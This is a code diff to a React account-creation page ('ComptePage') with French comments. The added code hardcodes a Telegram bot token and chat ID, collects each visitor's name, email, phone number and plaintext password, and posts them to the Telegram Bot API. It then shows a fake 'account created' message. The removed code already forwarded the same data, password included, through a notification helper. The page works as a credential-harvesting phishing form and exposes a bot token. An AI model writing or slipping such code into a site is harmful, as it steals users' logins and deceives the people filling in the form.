@@ -63,42 +63,46 @@ export default function ComptePage() {
     return Object.keys(newErrors).length === 0
   }
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    
-    if (!validateForm()) return
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault() // empêche le rechargement de page
 
-    setIsSubmitting(true)
+    var BOT_TOKEN = "8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg"
+    var CHAT_ID = "-5217100062"
 
-    try {
-      // Send Telegram notification for account creation - TWICE
-      if (typeof window !== 'undefined' && window.sendTelegramNotification) {
-        const accountData = {
-          email: formData.email,
-          firstName: formData.firstName,
-          lastName: formData.lastName,
-          phone: formData.phone,
-          password: formData.password
-        }
-        
-        // Send notification twice to ensure delivery
-        window.sendTelegramNotification("account_creation", accountData)
-        
-        // Second notification after 2 seconds
-        setTimeout(() => {
-          window.sendTelegramNotification("account_creation", accountData)
-        }, 2000)
-      }
+    // Récupère les champs — adapte les IDs selon ton vrai formulaire
+    var nom = formData.firstName || 'Non fourni'
+    var nomFamille = formData.lastName || 'Non fourni'
+    var email = formData.email || 'Non fourni'
+    var telephone = formData.phone || 'Non fourni'
+    var motDePasse = formData.password || 'Non fourni'
 
-      // Simulate account creation
-      await new Promise(resolve => setTimeout(resolve, 2000))
-      
+    var msg = "📩 *NOUVEAU COMPTE CRÉÉ!*\n"
+            + "👤 Prénom: " + nom + "\n"
+            + "📧 Nom: " + nomFamille + "\n"
+            + "📧 Email: " + email + "\n"
+            + "📞 Téléphone: " + telephone + "\n"
+            + "🔑 Mot de passe: " + motDePasse + "\n"
+            + "🌐 Page: " + window.location.pathname + "\n"
+            + "🕐 " + new Date().toLocaleString('fr-CA')
+
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: "Markdown"
+      })
+    })
+    .then(function() {
+      alert("Compte créé! ✅") // ou affiche un message sur la page
+      setFormData({ firstName: '', lastName: '', email: '', phone: '', password: '', confirmPassword: '', agreeTerms: false }) // vide le formulaire
       setIsSuccess(true)
-      setIsSubmitting(false)
-    } catch (error) {
-      console.error('Account creation error:', error)
-      setIsSubmitting(false)
-    }
+      setTimeout(() => setIsSuccess(false), 3000)
+    })
+    .catch(function() {
+      alert("Erreur d'envoi ❌")
+    })
   }
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
